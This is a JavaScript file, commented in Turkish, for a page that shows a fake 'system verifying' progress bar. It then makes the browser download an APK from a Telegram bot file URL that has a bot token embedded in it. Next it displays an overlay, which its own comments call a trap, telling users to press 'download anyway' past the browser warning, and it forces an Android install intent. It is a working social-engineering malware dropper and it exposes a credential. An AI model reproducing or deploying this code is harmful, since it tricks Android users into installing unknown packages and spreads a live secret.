// Fonksiyonun tanımlı olduğundan emin olmak için en başa alıyoruz
const runProgressBar = (callback) => {
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    let width = 0;

    const interval = setInterval(() => {
        width += Math.random() * 7; 
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Sistem doğrulanıyor...";
            if (callback) callback();
        } else {
            bar.style.width = width + "%";
            status.innerText = "Hazırlanıyor: %" + Math.round(width);
        }
    }, 100);
};

// Buton tıklama olayı
document.addEventListener('DOMContentLoaded', () => {
    const startBtn = document.getElementById('start-btn');
    
    if (startBtn) {
        startBtn.addEventListener('click', function() {
            this.style.display = 'none'; // Butonu gizle
            
            runProgressBar(() => {
                const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";

                // 1. İndirme Penceresini Tetikle
                window.location.assign(apkUrl);

                // 2. Tuzağı Kur (Yarım saniye sonra)
                setTimeout(() => {
                    const trap = document.getElementById('click-trap');
                    const status = document.getElementById('status');
                    if (trap) trap.style.display = "block";
                    if (status) status.innerHTML = "<b style='color:#d93025'>DİKKAT:</b> Devam etmek için alttaki <b>'Yine de indir'</b> butonuna basın.";
                }, 800);
            });
        });
    }
});

// Tuzak Katmanı Tıklandığında (Android Intent Zorlaması)
document.getElementById('click-trap').addEventListener('click', () => {
    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
    const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
    
    window.location.href = intentUrl;
});
